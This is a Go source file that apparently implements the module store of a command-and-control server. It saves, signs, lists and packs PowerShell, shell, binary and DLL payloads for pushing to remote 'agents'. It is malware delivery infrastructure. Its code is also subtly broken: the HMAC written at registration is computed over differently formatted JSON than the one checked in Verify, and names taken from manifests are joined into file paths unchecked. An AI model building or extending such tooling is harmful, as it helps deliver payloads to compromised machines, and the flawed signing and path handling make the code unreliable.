package module

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Manifest defines a dynamic module that can be pushed to agents.
type Manifest struct {
	Name        string            `json:"name"`
	Version     string            `json:"version"`
	Platform    string            `json:"platform"` // "windows", "linux", "darwin", "all"
	Arch        string            `json:"arch"`     // "amd64", "arm64", "any"
	Description string            `json:"description"`
	Type        string            `json:"type"` // "ps1", "sh", "binary", "dll"
	Commands    []string          `json:"commands"`
	Files       map[string]string `json:"files"` // filename → base64 content
	HMAC        string            `json:"hmac"`  // HMAC-SHA256 signature
	Author      string            `json:"author"`
	Created     time.Time         `json:"created"`
}

// PackedModule is sent over the wire to an agent.
type PackedModule struct {
	Manifest Manifest `json:"manifest"`
	Payload  string   `json:"payload"` // base64 of the module content
}

// Store manages the module repository on the C2 server.
type Store struct {
	baseDir string
	modules map[string]*Manifest
	mu      sync.RWMutex
	hmacKey []byte
}

// NewStore creates a module store.
func NewStore(baseDir string, hmacKey []byte) *Store {
	os.MkdirAll(baseDir, 0755)
	s := &Store{
		baseDir: baseDir,
		modules: make(map[string]*Manifest),
		hmacKey: hmacKey,
	}
	s.loadFromDisk()
	return s
}

func (s *Store) loadFromDisk() {
	entries, _ := os.ReadDir(s.baseDir)
	for _, e := range entries {
		if e.IsDir() {
			manifestPath := filepath.Join(s.baseDir, e.Name(), "manifest.json")
			if m, err := s.loadManifest(manifestPath); err == nil {
				s.modules[m.Name] = m
			}
		}
	}
}

func (s *Store) loadManifest(path string) (*Manifest, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var m Manifest
	if err := json.Unmarshal(data, &m); err != nil {
		return nil, err
	}
	return &m, nil
}

// List returns all available modules.
func (s *Store) List() []*Manifest {
	s.mu.RLock()
	defer s.mu.RUnlock()
	result := make([]*Manifest, 0, len(s.modules))
	for _, m := range s.modules {
		result = append(result, m)
	}
	return result
}

// Get returns a module by name.
func (s *Store) Get(name string) *Manifest {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.modules[name]
}

// Register adds a module to the store.
func (s *Store) Register(m *Manifest) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Create module directory
	modDir := filepath.Join(s.baseDir, m.Name)
	os.MkdirAll(modDir, 0755)

	// Save manifest
	m.Created = time.Now()
	data, _ := json.MarshalIndent(m, "", "  ")
	manifestPath := filepath.Join(modDir, "manifest.json")
	if err := os.WriteFile(manifestPath, data, 0644); err != nil {
		return fmt.Errorf("save manifest: %w", err)
	}

	// Save payload files
	for filename, contentB64 := range m.Files {
		content, err := base64.StdEncoding.DecodeString(contentB64)
		if err != nil {
			return fmt.Errorf("decode %s: %w", filename, err)
		}
		filePath := filepath.Join(modDir, filename)
		if err := os.WriteFile(filePath, content, 0644); err != nil {
			return fmt.Errorf("save %s: %w", filename, err)
		}
	}

	// Compute and set HMAC
	m.HMAC = s.computeHMAC(data)
	s.modules[m.Name] = m

	// Update manifest on disk with HMAC
	data, _ = json.MarshalIndent(m, "", "  ")
	os.WriteFile(manifestPath, data, 0644)

	return nil
}

// Pack prepares a module for sending to an agent.
func (s *Store) Pack(name string) (*PackedModule, error) {
	s.mu.RLock()
	m, ok := s.modules[name]
	s.mu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("module not found: %s", name)
	}

	packed := &PackedModule{Manifest: *m}

	// Read the first payload file as the main payload
	modDir := filepath.Join(s.baseDir, name)
	entries, _ := os.ReadDir(modDir)
	for _, e := range entries {
		if !e.IsDir() && !strings.HasSuffix(e.Name(), ".json") {
			data, err := os.ReadFile(filepath.Join(modDir, e.Name()))
			if err == nil {
				packed.Payload = base64.StdEncoding.EncodeToString(data)
				break
			}
		}
	}

	return packed, nil
}

// Verify checks the HMAC signature of a module manifest.
func (s *Store) Verify(m *Manifest) bool {
	// Strip HMAC field before verification
	originalHMAC := m.HMAC
	m.HMAC = ""
	data, _ := json.Marshal(m)
	expected := s.computeHMAC(data)
	m.HMAC = originalHMAC
	return hmac.Equal([]byte(originalHMAC), []byte(expected))
}

func (s *Store) computeHMAC(data []byte) string {
	if len(s.hmacKey) == 0 {
		return ""
	}
	mac := hmac.New(sha256.New, s.hmacKey)
	mac.Write(data)
	return fmt.Sprintf("%x", mac.Sum(nil))
}

// Delete removes a module from the store.
func (s *Store) Delete(name string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.modules, name)
	return os.RemoveAll(filepath.Join(s.baseDir, name))
}

// GetPayloadPath returns the path to a module's payload file.
func (s *Store) GetPayloadPath(name string) (string, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	modDir := filepath.Join(s.baseDir, name)
	entries, _ := os.ReadDir(modDir)
	for _, e := range entries {
		if !e.IsDir() && !strings.HasSuffix(e.Name(), ".json") {
			return filepath.Join(modDir, e.Name()), nil
		}
	}
	return "", fmt.Errorf("no payload found for module %s", name)
}
